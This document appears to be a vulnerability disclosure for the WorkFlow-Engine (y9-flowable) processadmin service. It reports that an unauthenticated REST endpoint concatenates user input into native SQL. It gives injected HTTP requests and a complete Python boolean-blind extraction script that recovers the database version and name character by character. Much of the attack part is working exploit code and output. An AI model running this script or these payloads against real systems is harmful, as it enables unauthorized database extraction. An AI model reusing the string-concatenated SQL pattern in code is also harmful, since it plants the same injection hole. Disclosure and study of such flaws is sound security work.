# WorkFlow-Engine — Unauthorized access + SQL blind injection (processadmin front end)

## Introduction

The processadmin OAuth2 resource filter only covers `protectedUrlPatterns: /vue/*,/editor/*,/modeler*`（application.yml:264），while `/services/rest/*` is guarded only by `CommonParamsFilter`, which takes client headers `X-Tenant-Id`/`X-User-Id` into the user context / tenant datasource with **no token or session check**（ProcessAdminConfiguration.java:142-144、CommonParamsFilter.java:37-58). `HistoricProcessApiImpl` (`/services/rest/historicProcess`, HistoricProcessApiImpl.java:31) is therefore fully reachable without authentication. Its `getByIdAndYear` (HistoricProcessApiImpl.java:81-82 → CustomHistoricProcessServiceImpl.java:76-87) concatenates `year` into a **table-name** position and `processInstanceId` into a **single-quoted string** position then runs native SQL — `"SELECT * from ACT_HI_PROCINST_" + year + " p where p.PROC_INST_ID_ = '" + processInstanceId + "'"` (CustomHistoricProcessServiceImpl.java:80) — no parameterization, so the whole database is extractable by boolean blind injection without logging in.

## Affected versions

y9-flowable / WorkFlow-Engine current (9.6.x)

## Utilize conditions

- Unauthorized SQL injection at the processadmin front end

---

## Vulnerability Reproduction

**Step 1** — unauthenticated baseline (no token / no `Authorization` returns data):

```http
GET /services/rest/historicProcess/getByIdAndYear?year=2024&processInstanceId=pid1 HTTP/1.1
Host: 127.0.0.1:7070
Content-Length: 8
```

![image-20260821173106326](https://github.com/fangtang7/picx-images-hosting/raw/master/work/image-20260821173106326.51evubpmg8.webp)

Response (200, no 401 — proves no auth filter on this path):

```json
{"success":true,"rows":[{"ID_":"pid1","PROC_INST_ID_":"pid1"}],"sql":"SELECT * from ACT_HI_PROCINST_2024 p where p.PROC_INST_ID_ = 'pid1'"}
```

**Step 2** — boolean-blind, condition **true** (`pid1' AND '1'='1` → 1 row):

```http
GET /services/rest/historicProcess/getByIdAndYear?year=2024&processInstanceId=pid1%27+AND+%271%27%3D%271 HTTP/1.1
Host: 127.0.0.1:7070
Content-Length: 8
```

![image-20260821173451503](https://github.com/fangtang7/picx-images-hosting/raw/master/work/image-20260821173451503.8okfhum00a.webp)

Response :

```json
{"success":true,"rows":[{"ID_":"pid1","PROC_INST_ID_":"pid1"}],"sql":"SELECT * from ACT_HI_PROCINST_2024 p where p.PROC_INST_ID_ = 'pid1' AND '1'='1'"}
```

**Step 3** — condition **false** (`pid1' AND '1'='2` → 0 rows):

```http
GET /services/rest/historicProcess/getByIdAndYear?year=2024&processInstanceId=pid1%27+AND+%271%27%3D%272 HTTP/1.1
Host: 127.0.0.1:7070
Content-Length: 8
```

![image-20260821173441231](https://github.com/fangtang7/picx-images-hosting/raw/master/work/image-20260821173441231.2ksnfejpcs.webp)

Response :

```json
{"success":true,"rows":[]}
```

By guessing one character at a time (`...' AND substr(version(),1,1)='9' AND '1'='1`), rows 1/0 is the true/false oracle — the generated SQL is executed server-side on a live instance (2026-08-21). A scripted boolean-blind extractor (`poc/wf_bool_blind.py`, self-calibrating `1=1`/`1=0` oracle) recovered:

python poc：

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WorkFlow-Engine (y9-flowable) processadmin Boolean-Bind SQL Injection — extract version()/database()
=====================================================================================================================
Repro sink:  HistoricProcessApiImpl#getByIdAndYear -> CustomHistoricProcessServiceImpl#getByIdAndYear
          "SELECT * from ACT_HI_PROCINST_" + year + " p where p.PROC_INST_ID_ = '" + processInstanceId + "'"
          -> native SQL. processInstanceId is a single-quoted string slot, year is a table-name slot.
          No authentication on /services/rest/* (OAuth2 resource filter only covers /vue/*,/editor/*,/modeler*).

Plain boolean oracle (no timing, no noise):
    processInstanceId = <pid>' AND <COND> AND '1'='1   -> rows returned (COND true)
    processInstanceId = <pid>' AND <COND> AND '1'='2   -> 0 rows      (COND false)
References are CALIBRATED at runtime (1=1 / 1=0) so it adapts to any target row.
On a real target replace <pid> with an existing PROC_INST_ID_ (or use `1' OR <COND> -- ` to skip the pid).
"""
import json
import sys
import urllib.parse
import urllib.request

BASE = "http://127.0.0.1:7070/services/rest/historicProcess/getByIdAndYear"
PID = "pid1"          # an existing PROC_INST_ID_ in the ACT_HI_PROCINST_<year> table
YEAR = "2024"
CHARSET = " abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._-()+*.:/,=@#$"


def rows_of(cond: str) -> list:
    pid = "{0}' AND {1} AND '1'='1".format(PID, cond)
    url = BASE + "?" + urllib.parse.urlencode({"year": YEAR, "processInstanceId": pid})
    with urllib.request.urlopen(url, timeout=10) as r:
        data = json.loads(r.read().decode())
    return data.get("rows", [])


def oracle(cond: str) -> bool:
    return len(rows_of(cond)) > 0


def calibrate():
    if not oracle("1=1") or oracle("1=0"):
        raise RuntimeError("calibration failed — PID={0} not in ACT_HI_PROCINST_{1}, or /services/rest/* filtered".format(PID, YEAR))
    print("[*] oracle: 1=1 -> rows>0 (true), 1=0 -> 0 rows (false)  (PID={0}, YEAR={1})".format(PID, YEAR))


def guess_char(expr: str, pos: int) -> str:
    for c in CHARSET:
        cond = "substr({0},{1},1)='{2}'".format(expr, pos, c.replace("'", "''"))
        if oracle(cond):
            return c
    return "?"


def extract(expr: str, length: int, label: str) -> str:
    out = ""
    for pos in range(1, length + 1):
        out += guess_char(expr, pos)
        sys.stdout.write("\r{0}: {1}".format(label, out))
        sys.stdout.flush()
    sys.stdout.write("\r" + " " * 40 + "\r")
    print("{0} = {1}".format(label, out))
    return out


if __name__ == "__main__":
    calibrate()
    extract("version()", 32, "version()")
    extract("database()", 32, "database()")
```

![image-20260821172912876](https://github.com/fangtang7/picx-images-hosting/raw/master/work/image-20260821172912876.7i1498xyhu.webp)

```
version()  = 9.6.0
database() = wf_business_dev
```



code:

![image-20260821174050283](https://github.com/fangtang7/picx-images-hosting/raw/master/work/image-20260821174050283.7sny2edivl.webp)
